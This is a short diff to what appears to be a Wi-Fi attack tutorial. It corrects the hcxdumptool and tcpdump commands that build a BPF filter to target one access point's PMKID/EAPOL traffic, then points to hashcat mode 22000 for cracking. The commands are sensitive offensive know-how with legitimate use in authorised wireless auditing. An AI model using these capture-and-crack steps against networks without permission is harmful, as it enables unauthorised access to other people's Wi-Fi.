@@ -50,9 +50,11 @@ PMKID = HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC). Computed from first EA
 # Use -w for the capture file, --rds for the realtime display, and --bpf for filters.
 sudo hcxdumptool -i wlan0mon -w capture.pcapng --rds=1
 
-# Target a specific AP via BPF (build the filter with tcpdump --dump-bpf)
-sudo tcpdump -y IEEE802_11_RADIO -i wlan0mon --dump-bpf \
+# Target a specific AP via BPF (hcxdumptool reads tcpdump -ddd output: a count line, then 4 decimal numbers per instruction)
+sudo tcpdump -y IEEE802_11_RADIO -i wlan0mon -ddd \
   "wlan addr3 aa:bb:cc:dd:ee:ff" > target.bpf
+# Builds with libpcap support compile the expression directly, without a capture interface:
+hcxdumptool --bpfc="wlan addr3 aa:bb:cc:dd:ee:ff" > target.bpf
 sudo hcxdumptool -i wlan0mon -w capture.pcapng --bpf=target.bpf --rds=1
 
 # Convert for hashcat (mode 22000 is the primary output)
